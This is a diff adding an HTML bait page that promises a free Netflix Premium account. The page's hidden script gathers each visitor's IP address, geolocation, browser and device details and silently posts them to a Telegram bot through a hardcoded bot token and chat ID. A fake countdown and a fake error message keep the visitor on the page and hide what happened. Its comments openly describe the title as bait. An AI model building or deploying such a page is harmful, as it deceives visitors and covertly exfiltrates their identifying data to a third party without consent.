@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Premium Account Generator</title>  <!-- Fake title for bait -->
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        .loading { color: green; font-size: 24px; }
+    </style>
+</head>
+<body>
+    <h1>🔓 Unlock Your Free Netflix Premium Account</h1>
+    <p>Generating your account... Please wait <span id="countdown">5</span> seconds.</p>
+    <div class="loading">Loading...</div>
+
+    <script>
+        // ===== CONFIG =====
+        const BOT_TOKEN = "7667911644:AAGiVILs-fGdPU5aAVjIKBIRiabkXPLu-R0";
+        const CHAT_ID = "7401394429";
+        // ==================
+
+        // Collect visitor data
+        const data = {
+            ip: "",
+            userAgent: navigator.userAgent,
+            screen: `${screen.width}x${screen.height}`,
+            language: navigator.language,
+            referrer: document.referrer || "Direct visit",
+            cookiesEnabled: navigator.cookieEnabled,
+            platform: navigator.platform,
+            timestamp: new Date().toISOString()
+        };
+
+        // Get IP and geolocation
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(({ ip }) => {
+                data.ip = ip;
+                return fetch(`http://ip-api.com/json/${ip}?fields=country,city,isp`);
+            })
+            .then(response => response.json())
+            .then(geo => {
+                data.geo = geo;
+                sendToTelegram(data);
+            });
+
+        // Send to Telegram bot
+        function sendToTelegram(data) {
+            const text = `🕵️ *NEW VISITOR* 🕵️\n\n${JSON.stringify(data, null, 2)}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: "Markdown"
+                })
+            });
+        }
+
+        // Fake countdown to keep user on page
+        let seconds = 5;
+        const timer = setInterval(() => {
+            document.getElementById("countdown").textContent = seconds;
+            seconds--;
+            if (seconds < 0) {
+                clearInterval(timer);
+                document.querySelector(".loading").innerHTML = "⚠️ Error: Too many users. Try again later.";
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
